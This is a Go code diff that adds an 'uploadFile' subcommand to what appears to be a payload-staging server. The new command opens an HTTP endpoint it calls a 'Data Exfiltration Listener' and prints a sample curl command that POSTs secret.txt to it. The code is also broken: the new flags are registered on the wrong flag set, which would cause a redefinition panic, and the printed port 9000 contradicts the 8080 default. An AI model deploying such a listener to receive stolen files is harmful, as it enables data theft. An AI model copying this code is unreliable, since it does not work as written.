@@ -124,6 +124,13 @@ func main(){
 	stageDirectoryPort := stageDirectoryOption.String("p", "8080", "Specifies the port number to host the server")
 	stageDirectoryDir := stageDirectoryOption.String("f", "payloads", "Specifies the file path of the directory")
 
+	// Stores the flag set for uploading files
+	uploadFilesOption := flag.NewFlagSet("uploadFile", flag.ExitOnError)
+
+	// Stores the flags for this flagset
+	uploadFilesPort := stageDirectoryOption.String("p", "8080", "Specifies the port number to host the server")
+	uploadFilesUrlPath := stageDirectoryOption.String("u", "/upload", "Specifies the URL path to host the endpoint")
+
 	// Checks if the user has provided a subcommand
 	if len(os.Args) < 2 {
 		// Outputs an invaild command
@@ -140,5 +147,19 @@ func main(){
 
 		// Passes the flags into the function
 		stagePayloadDirectory(*stageDirectoryPort, *stageDirectoryDir)
+	case "uploadFile":
+		// Parse the flags
+		uploadFilesOption.Parse(os.Args[2:])
+
+		// Handles the function
+		http.HandleFunc(*uploadFilesUrlPath, uploadHandler)
+
+		// Prints information about the path
+		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
+		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
+
+		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
+			log.Fatal(err)
+		}
 	}
 }
